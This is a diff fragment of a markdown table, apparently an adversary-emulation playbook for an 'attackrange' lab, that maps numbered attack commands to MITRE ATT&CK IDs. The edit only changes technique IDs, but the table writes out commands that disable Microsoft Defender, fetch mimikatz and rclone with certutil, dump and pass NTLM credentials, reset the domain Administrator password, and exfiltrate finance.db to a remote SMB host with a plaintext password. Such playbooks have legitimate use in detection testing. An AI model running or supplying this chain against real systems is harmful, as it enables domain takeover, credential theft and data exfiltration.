@@ -10,7 +10,7 @@
 |4 | `net localgroup administrators`| T1069.001|
 |5 | `Get-Process \| Select -Unique ProcessName` | T1057|
 |6 | `Get-MpComputerStatus` | T1518.001|
-|7 | `Set-MpPreference -DisableRealtimeMonitoring 1`<br>`Set-MpPreference -DisableBehaviorMonitoring 1`<br>`Set-MpPreference -DisableScriptScanning 1`<br>`Set-MpPreference -DisableBlockAtFirstSeen 1` | T1562.001|
+|7 | `Set-MpPreference -DisableRealtimeMonitoring 1`<br>`Set-MpPreference -DisableBehaviorMonitoring 1`<br>`Set-MpPreference -DisableScriptScanning 1`<br>`Set-MpPreference -DisableBlockAtFirstSeen 1` | T1685|
 |8 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe` | T1105|
 |9 | `C:\temp\m.exe`<br>`privilege::debug`<br>`sekurlsa::logonpasswords` | T1003.001|
 |10 | `[ITSERVER:mimikatz] sekurlsa::pth /user:billh /ntlm:<NTLM-hash> /domain:attackrange /run:powershell` | T1550.002|
@@ -28,7 +28,7 @@
 |17 | `Add-ADGroupMember -Identity "ITSupport" -Members "billh"` | T1098.007|
 |18 | `Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString 'DomainPwned!' -AsPlainText -Force) -Reset` | T1098|
 |19 | `xfreerdp3 /u:Administrator /p:'DomainPwned!' /d:ATTACKRANGE /v:10.0.1.16 /cert:ignore +clipboard` | T1021.001, T1078|
-|20 | `Set-MpPreference -DisableRealtimeMonitoring 1` | T1562.001|
+|20 | `Set-MpPreference -DisableRealtimeMonitoring 1` | T1685|
 |21 | `certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe` | T1105|
 |22 | `[ss]`<br>`type = smb`<br>`host = 10.0.1.30`<br>`user = user`<br>`pass = KN_sSidIRaFo_cmcZ_YNa5o8SLfyli8` | T1105, T1564, T1048|
 |23 | `C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Users\Administrator\Documents\finance.db ss:data --no-check-dest` | T1048|
